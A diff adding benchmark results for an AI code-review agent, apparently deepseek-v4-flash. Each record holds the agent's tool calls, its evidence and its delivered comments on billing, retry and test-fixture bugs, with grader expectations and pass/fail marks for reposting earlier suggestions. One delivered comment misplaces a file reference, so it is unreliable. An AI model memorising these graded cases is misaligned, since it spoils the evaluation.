+        "model": "ok"
+      },
+      "sandboxCalls": 29,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 1
+      },
+      "delivered": [],
+      "claims": [
+        {
+          "id": "resubmit-repeat-moved",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 2,
+      "case": "R13-repeat-after-move",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 45396,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/billing/tick.ts",
+          "claim": "WHAT: On NotReadyError the code resubmits via `gw.submit(charge.payload)`, but NotReadyError means the gateway already holds the charge (errors.ts:2: 'has the charge but has not settled it yet'), and gw.submit is explicitly non-idempotent (gateway.ts:3: 'every call creates a new charge'). WHY: pollCharge runs on every tick, so each unsettled charge triggers another submit and produces a duplicate charge/billing on every poll cycle. The in-code comment at lines 6-7 ('NotReadyError means the gateway never received it') inverts the actual error semantics and drives this. HOW: do not resubmit on NotReadyError — treat it as transient and wait (e.g. return a 'pending' state without calling submit), and correct the misleading comment.",
+          "keep": true,
+          "rationale": "Confirmed by source: errors.ts:1-2 defines NotReadyError as 'The gateway has the charge but has not settled it yet (transient)', and gateway.ts:3 documents submit as 'NOT idempotent: every call creates a new charge.' tick.ts:13-15 resubmits via gw.submit on NotReadyError, and the comment at lines 6-7 wrongly asserts NotReadyError means the gateway never received it, inverting the real semantics. Since pollCharge runs on every tick, each unsettled charge triggers another non-idempotent submit, producing duplicate charges. The root cause and failure path are factually accurate; nothing guards against it. This also matches the earlier un-implemented previous decision at poller.ts (same logic), and the current diff shows no change addressing it.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/tick.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "findFile",
+              "args": {
+                "pattern": "errors.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "findFile",
+              "args": {
+                "pattern": "gateway.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "NotReadyError",
+                "namesOnly": true
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "submit\\(|creates a new charge|idempotent",
+                "glob": "*.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/errors.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/gateway.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/status.ts"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [
+        {
+          "file": "src/billing/tick.ts",
+          "line": 13,
+          "label": "bug",
+          "earlierId": "round-a-resubmit",
+          "earlierOutcome": "not_implemented",
+          "revisesSuggestionId": null,
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 22,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 1
+      },
+      "delivered": [],
+      "claims": [
+        {
+          "id": "resubmit-repeat-moved",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 3,
+      "case": "R13-repeat-after-move",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 89085,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/billing/tick.ts",
+          "claim": "WHAT: pollCharge resubmits the charge via gw.submit on NotReadyError, but per errors.ts NotReadyError means the gateway already has the charge (just not settled) and gateway.ts documents submit as non-idempotent. WHY: every tick that observes a transient NotReadyError creates a brand-new charge, producing duplicate/over-charging of the customer. HOW: do not resubmit on NotReadyError; treat it as pending and return without calling gw.submit, e.g. `return { state: 'pending' as const };`.",
+          "keep": true,
+          "rationale": "Confirmed via errors.ts: NotReadyError is documented as 'The gateway has the charge but has not settled it yet (transient)', and gateway.ts explicitly documents submit() as 'NOT idempotent: every call creates a new charge'. The flow in status.ts rethrows NotReadyError, and tick.ts pollCharge catches it and calls gw.submit(charge.payload), which per the gateway contract creates a brand-new charge. So each tick observing a transient NotReadyError produces a duplicate charge. The inline comment in tick.ts claiming NotReadyError means 'the gateway never received it' contradicts errors.ts, which is the authoritative definition of the error — the finding's premise matches the actual contract. The prior review decision (round-a-resubmit) covered the identical issue at poller.ts (a pure re-export of this function) with outcome not_implemented, so it neither resolves nor refutes the claim. No upstream guard prevents the resubmit. KEEP.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/tick.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/errors.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/gateway.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/poller.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/status.ts"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 12,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 1
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "src/billing/tick.ts",
+          "line": 13,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "bug",
+          "marked": false,
+          "text": "Per `errors.ts`, `NotReadyError` means the gateway already has the charge and `gateway.ts` documents `submit` as non-idempotent, so every tick that observes a transient `NotReadyError` creates a brand-new charge and duplicates/over-charges the customer. Stop calling `gw.submit` in the `NotReadyError` branch and instead treat the charge as pending by returning `{ state: 'pending' as const }`."
+        }
+      ],
+      "claims": [
+        {
+          "id": "resubmit-repeat-moved",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "critical",
+          "pass": false
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 4,
+      "case": "R13-repeat-after-move",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 76410,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/billing/tick.ts",
+          "claim": "WHAT: pollCharge calls gw.submit(charge.payload) when fetchStatus throws NotReadyError, but NotReadyError is documented as 'The gateway has the charge but has not settled it yet (transient)' (errors.ts:2) while gw.submit is documented as 'NOT idempotent: every call creates a new charge' (gateway.ts:3). WHY: the gateway already holds the charge, so every tick that observes NotReadyError creates an additional charge — repeated ticks produce duplicate charges against the same logical payment (double billing). HOW: do not resubmit on NotReadyError; treat it as a transient not-yet-settled state and return/await the next tick, e.g. `if (err instanceof NotReadyError) { return { state: 'pending' as const }; }` (and fix the stale comment on line 7, which claims the opposite of errors.ts).",
+          "keep": true,
+          "rationale": "Confirmed: errors.ts:1 documents NotReadyError as 'The gateway has the charge but has not settled it yet (transient)', while gateway.ts:3 documents submit as 'NOT idempotent: every call creates a new charge.' tick.ts:13-15 resubmits via gw.submit(charge.payload) whenever fetchStatus throws NotReadyError, so each tick observing a transient not-yet-settled state creates an additional charge — duplicate billing. The stale comment at tick.ts:7 claims the opposite of errors.ts. The prior review decision round-a-resubmit raised this same issue but is marked not_implemented, so it is not evidence of a rejected/applied fix. No refutation available.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/tick.ts",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            },
+            {
+              "name": "findFile",
+              "args": {
+                "pattern": "errors.ts",
+                "path": "src/billing"
+              },
+              "failed": false
+            },
+            {
+              "name": "findFile",
+              "args": {
+                "pattern": "gateway.ts",
+                "path": "src/billing"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/errors.ts",
+                "startLine": 1,
+                "endLine": 20
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/gateway.ts",
+                "startLine": 1,
+                "endLine": 25
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "NotReadyError|fetchStatus",
+                "path": "src/billing",
+                "excludeTests": true
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 21,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 1
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "src/billing/tick.ts",
+          "line": 13,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "bug",
+          "marked": false,
+          "text": "Because `gw.submit` is documented as not idempotent (gateway.ts:3) and `NotReadyError` means the gateway already holds the charge but has not settled it (errors.ts:2), every tick that observes `NotReadyError` in `pollCharge` creates an additional charge against the same logical payment, producing duplicate charges (double billing). Treat `NotReadyError` as a transient not-yet-settled state and return `{ state: 'pending' as const }` instead of resubmitting, and fix the stale comment on line 7 that claims the opposite of errors.ts."
+        }
+      ],
+      "claims": [
+        {
+          "id": "resubmit-repeat-moved",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "critical",
+          "pass": false
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 5,
+      "case": "R13-repeat-after-move",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 88374,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/billing/tick.ts",
+          "claim": "WHAT: On NotReadyError, pollCharge calls gw.submit(charge.payload), but NotReadyError is documented in errors.ts as 'the gateway has the charge but has not settled it yet' and gw.submit is documented in gateway.ts as NOT idempotent (every call creates a new charge). WHY: the charge already exists at the gateway, so every tick that sees NotReadyError creates an additional duplicate charge for the same payload — a financial/correctness defect that compounds on each poll. The doc comment on line 7 ('NotReadyError means the gateway never received it: resubmit') contradicts the error's own definition. HOW: do not resubmit on NotReadyError; treat it as a transient not-settled state and wait/return without calling submit (e.g. return { state: 'pending' }).",
+          "keep": true,
+          "rationale": "Confirmed against source: errors.ts:1 documents NotReadyError as 'The gateway has the charge but has not settled it yet (transient)', and gateway.ts:3 documents submit as 'NOT idempotent: every call creates a new charge.' tick.ts:13-15 resubmits via gw.submit(charge.payload) on NotReadyError, so each tick re-creates a charge the gateway already holds — a duplicate-charge defect that compounds per poll. The root cause, the non-idempotency, and the contradiction with the line-7 comment are all present as claimed. This matches the earlier round-a-resubmit suggestion, which is marked not_implemented, so there is no applied change to refute it.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/tick.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "findFile",
+              "args": {
+                "pattern": "errors.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "findFile",
+              "args": {
+                "pattern": "gateway.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "NotReadyError"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "submit",
+                "glob": "*gateway*"
+              },
+              "failed": false
+            },
+            {
+              "name": "listDir",
+              "args": {
+                "path": "src/billing"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/errors.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/gateway.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/status.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/billing/poller.ts"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 24,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 1
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "src/billing/tick.ts",
+          "line": 13,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "bug",
+          "marked": false,
+          "text": "Because `NotReadyError` means the gateway already has the charge but has not settled it, and `gw.submit` is documented in `gateway.ts` as not idempotent (every call creates a new charge), every poll in `pollCharge` that catches it creates another duplicate charge for `charge.payload`, a financial/correctness defect that compounds; the line 7 comment in `errors.ts` telling callers to resubmit also contradicts the error's definition. Do not call `gw.submit` on `NotReadyError`; treat it as a transient not-settled state and return without resubmitting, such as `{ state: 'pending' }`."
+        }
+      ],
+      "claims": [
+        {
+          "id": "resubmit-repeat-moved",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "critical",
+          "pass": false
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 1,
+      "case": "R17-repost-prod-profile",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 89550,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/sync/retry.ts",
+          "claim": "WHAT: `sleep(200 * attempt)` on line 12 is not awaited, so its promise is discarded. WHY: the retry loop proceeds to the next `await fn()` immediately after each failure, so the intended backoff never happens and a failing downstream is hammered three times back-to-back (the change from `sleep(200)` to `sleep(200 * attempt)` never took effect because the call is still unawaited). HOW: `await sleep(200 * attempt);`.",
+          "keep": true,
+          "rationale": "src/sync/retry.ts line 12 reads `sleep(200 * attempt);` with no `await`, so the promise is discarded and the loop proceeds immediately to the next `await fn()` in the next iteration. The backoff never takes effect and a failing downstream is retried three times back-to-back. This is confirmed directly in the source. Although PreviousDecision round-a-await-sleep marked the await fix as 'implemented', the current code shows it was never actually applied (the argument was changed to 200*attempt but no await was added), which is concrete evidence the earlier fix is absent, so the finding stands.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/sync/retry.ts",
+                "startLine": 1,
+                "endLine": 30
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/sync/retry.ts",
+          "claim": "WHAT: `log.warn('retrying', { attempt })` is emitted on every iteration including the last one, where the loop then exits and throws without any retry. WHY: on the final failure the logs claim a retry is happening when the operation has actually given up, producing a misleading signal for anyone diagnosing the failure. HOW: only log/sleep when another attempt remains, e.g. `if (attempt < attempts) { log.warn('retrying', { attempt }); await sleep(200 * attempt); }`.",
+          "keep": true,
+          "rationale": "The loop iterates attempt=1..attempts inclusive; on the final iteration (attempt===attempts) a rejected fn() still hits the catch block that unconditionally emits log.warn('retrying') and sleeps, after which the loop exits and throws lastError. So the log claims a retry on the very failure where the operation gives up — exactly as the finding describes. The claim is factually correct, no upstream guard prevents it, and it is a runtime log-accuracy issue rather than pure style. No refutation available.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/sync/retry.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/sync/retry.ts",
+                "startLine": 4,
+                "endLine": 16
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [
+        {
+          "file": "src/sync/retry.ts",
+          "line": 12,
+          "label": "bug",
+          "earlierId": "round-a-await-sleep",
+          "earlierOutcome": "implemented",
+          "revisesSuggestionId": null,
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 14,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 2,
+        "after": 2
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "src/sync/retry.ts",
+          "line": 11,
+          "severity": "low",
+          "linkedById": false,
+          "label": "bug",
+          "marked": false,
+          "text": "In `src/sync/retry.ts`, the final failure logs `log.warn('retrying', { attempt })` even though the operation has given up, which misleads anyone diagnosing the failure. Only log and `await sleep(200 * attempt)` when `attempt < attempts` so the last attempt does not emit a false retry signal or sleep."
+        }
+      ],
+      "claims": [
+        {
+          "id": "await-sleep-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 2,
+      "case": "R17-repost-prod-profile",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 66589,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/sync/retry.ts",
+          "claim": "WHAT: `sleep(200 * attempt)` is called without `await`, so the returned Promise is discarded and no backoff delay is applied between retries. WHY: `sleep` is `(ms) => new Promise<void>(resolve => setTimeout(resolve, ms))` (src/sync/sleep.ts:1); without awaiting it the loop immediately re-invokes `fn()`, so a failing dependency is hit back-to-back `attempts` times with zero delay — the exact failure the retry/backoff logic exists to prevent. HOW: await the call: `await sleep(200 * attempt);`.",
+          "keep": true,
+          "rationale": "Confirmed: src/sync/sleep.ts returns a Promise, and src/sync/retry.ts:12 calls sleep(200 * attempt) without await inside an async function, so the promise is discarded and retries fire back-to-back with no backoff. The earlier 'implemented' decision at this same location is contradicted by the current code, which still lacks await — concrete evidence the change was not actually applied.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/sync/retry.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/sync/sleep.ts"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [
+        {
+          "file": "src/sync/retry.ts",
+          "line": 11,
+          "label": "bug",
+          "earlierId": "round-a-await-sleep",
+          "earlierOutcome": "implemented",
+          "revisesSuggestionId": null,
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 15,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 1
+      },
+      "delivered": [],
+      "claims": [
+        {
+          "id": "await-sleep-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 3,
+      "case": "R17-repost-prod-profile",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 102207,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/sync/retry.ts",
+          "claim": "WHAT: the newly added `sleep(200 * attempt)` is not awaited, so the backoff between retries never actually happens. WHY: `sleep` returns a Promise (src/sync/sleep.ts:1) that is discarded, the `catch` block completes synchronously, and the loop immediately re-invokes `fn()` — a failing downstream service is hammered `attempts` times back-to-back with no delay, exactly the behavior this change is supposed to fix. HOW: await the call: `await sleep(200 * attempt);`.",
+          "keep": true,
+          "rationale": "Confirmed by reading the code. src/sync/retry.ts:12 is `sleep(200 * attempt);` with no `await`. sleep is defined as `(ms) => new Promise<void>(...)` (src/sync/sleep.ts:1), so the returned Promise is discarded; the catch block completes synchronously and the for-loop immediately re-invokes fn(), meaning retries fire back-to-back with no backoff. The described root cause and failure path are accurate. Although a previous decision (round-a-await-sleep) marked an await-the-sleep fix as \"implemented\", the current diff concretely shows the await is absent, so the applied change is not present.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/sync/retry.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/sync/sleep.ts"
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/sync/retry.ts",
+          "claim": "WHAT: the catch block runs on the final attempt as well, so it logs \"retrying\" and schedules `sleep(200 * attempt)` even though the loop exits immediately after and `throw lastError` is executed. WHY: on retry exhaustion the caller is delayed by up to 200*attempts ms with no retry actually pending, and the log falsely claims a retry is happening. HOW: only back off and log when a subsequent attempt remains, e.g. `if (attempt < attempts) { log.warn('retrying', { attempt }); await sleep(200 * attempt); }`.",
+          "keep": true,
+          "rationale": "Confirmed against src/sync/retry.ts: the loop runs attempt 1..attempts, and on the final iteration a thrown error still enters the catch block (lines 10-12), logging 'retrying' and calling sleep(200*attempt) before the loop exits and `throw lastError` runs. The root cause is real: a false 'retrying' log is emitted and a pointless backoff is scheduled when no retry remains. The suggested guard `if (attempt < attempts)` correctly fixes it. (Minor imprecision: since sleep() is not awaited, the caller is not actually delayed by the backoff — but the core defect and root cause stand.) Not refuted.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/sync/retry.ts"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [
+        {
+          "file": "src/sync/retry.ts",
+          "line": 12,
+          "label": "bug",
+          "earlierId": "round-a-await-sleep",
+          "earlierOutcome": "implemented",
+          "revisesSuggestionId": null,
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 11,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 2,
+        "after": 2
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "src/sync/retry.ts",
+          "line": 11,
+          "severity": "low",
+          "linkedById": false,
+          "label": "bug",
+          "marked": false,
+          "text": "On retry exhaustion the caller is delayed by up to `200 * attempt` ms and `log.warn('retrying', ...)` claims a retry that never happens, because the loop exits and `throw lastError` runs immediately after the catch block. Guard both the log and `await sleep(200 * attempt)` with `if (attempt < attempts)` so they only run when a subsequent attempt remains."
+        }
+      ],
+      "claims": [
+        {
+          "id": "await-sleep-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 4,
+      "case": "R17-repost-prod-profile",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 75442,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/sync/retry.ts",
+          "claim": "WHAT: `sleep(200 * attempt)` is called without `await`, so the backoff promise is created and discarded and the loop never pauses between retries. WHY: every retry fires immediately after the previous failure, so a failing downstream service is hit `attempts` times back-to-back with no backoff, defeating the purpose of the retry logic and amplifying load on an already-failing dependency. HOW: await the sleep, and skip it on the final attempt since no retry follows: `if (attempt < attempts) await sleep(200 * attempt);`.",
+          "keep": true,
+          "rationale": "src/sync/retry.ts:12 calls `sleep(200 * attempt)` with no `await`, discarding the promise, so the backoff never pauses the loop. The earlier decision (round-a-await-sleep) marked the await as implemented, but the current code still shows it missing, which is concrete evidence the fix is not applied. Claim confirmed.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/sync/retry.ts",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [
+        {
+          "file": "src/sync/retry.ts",
+          "line": 12,
+          "label": "bug",
+          "earlierId": "round-a-await-sleep",
+          "earlierOutcome": "implemented",
+          "revisesSuggestionId": "round-a-await-sleep",
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 10,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 1
+      },
+      "delivered": [],
+      "claims": [
+        {
+          "id": "await-sleep-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 5,
+      "case": "R17-repost-prod-profile",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 54569,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/sync/retry.ts",
+          "claim": "WHAT: `sleep(200 * attempt)` is called without `await`, so the retry loop does not wait for the backoff timer before the next `fn()` invocation. WHY: the delay is fire-and-forget, so on every failure the next attempt runs immediately — the backoff is completely ineffective and a failing downstream service is hit `attempts` times back-to-back (this re-introduces the exact issue previously raised for `sleep(200)`). HOW: `await sleep(200 * attempt);` (and ideally skip the sleep on the final attempt, since no retry follows).",
+          "keep": true,
+          "rationale": "Confirmed: src/sync/retry.ts:12 calls `sleep(200 * attempt)` without `await`. `sleep` (src/sync/sleep.ts:1) returns a Promise that only resolves after the timeout, so without `await` the loop iterates immediately and the backoff never takes effect — a failing `fn()` is retried back-to-back. The earlier decision (round-a-await-sleep) claimed the missing-await fix was implemented, but the current diff still shows an un-awaited sleep (now with `* attempt`), which is concrete evidence the applied change is ineffective/reverted, so this is not superseded.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/sync/retry.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/sync/sleep.ts"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [
+        {
+          "file": "src/sync/retry.ts",
+          "line": 12,
+          "label": "bug",
+          "earlierId": "round-a-await-sleep",
+          "earlierOutcome": "implemented",
+          "revisesSuggestionId": null,
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 7,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 1
+      },
+      "delivered": [],
+      "claims": [
+        {
+          "id": "await-sleep-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 1,
+      "case": "P05-rule-local-path-fixture-touched",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 25510,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [
+        {
+          "file": "tests/conftest.py",
+          "line": 10,
+          "label": "kody_rules",
+          "earlierId": "round-a-P05-rule-local-path-fixture-touched",
+          "earlierOutcome": "implemented",
+          "revisesSuggestionId": "round-a-P05-rule-local-path-fixture-touched",
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 1,
+      "sandboxFailed": 0,
+      "warnings": 0,
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "tests/conftest.py",
+          "line": 18,
+          "severity": "medium",
+          "linkedById": false,
+          "label": "kody_rules",
+          "brokenKodyRulesIds": [
+            "rule-no-local-machine-paths"
+          ],
+          "marked": false,
+          "text": "The hard-coded `/Users/dev/billing-archive` path does not exist in CI or on other developers' machines, so any test relying on `settings.archive_dir` breaks there. Use a repository-relative path or pytest's `tmp_path` fixture, e.g. `archive_dir=str(tmp_path / \"billing-archive\")` with `tmp_path` added as a parameter."
